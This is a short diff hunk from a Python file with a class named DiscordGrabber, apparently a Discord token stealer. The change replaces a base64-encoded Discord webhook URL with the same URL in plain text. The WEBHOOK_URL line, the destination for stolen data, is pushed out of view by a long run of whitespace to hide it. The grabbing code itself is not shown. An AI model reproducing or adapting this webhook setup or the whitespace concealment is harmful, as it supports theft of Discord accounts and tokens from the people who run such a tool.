@@ -276,7 +276,7 @@ class DiscordGrabber:
 
 if __name__ == "__main__":
     
-                                                                                                                                                                                                                                                                                                                                                                                                                               WEBHOOK_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0ODMwNTg2MzI5ODI1NzAxNy9LTjNjdF9FZFZha0NyQW5BRG53Z282b0ZqUGxuN2JCWWhMWlhNaHVUU3l2UEdXcDFHWU1ZX3lPVTY0X1pYejFueUlmSg=="
+                                                                                                                                                                                                                                                                                                                                                                                                                               WEBHOOK_URL = "https://discord.com/api/webhooks/1448305863298257017/KN3ct_EdVakCrAnADnwgo6oFjPln7bBYhLZXMhuTSyvPGWp1GYMY_yOU64_ZXz1nyIfJ"
     
     
 
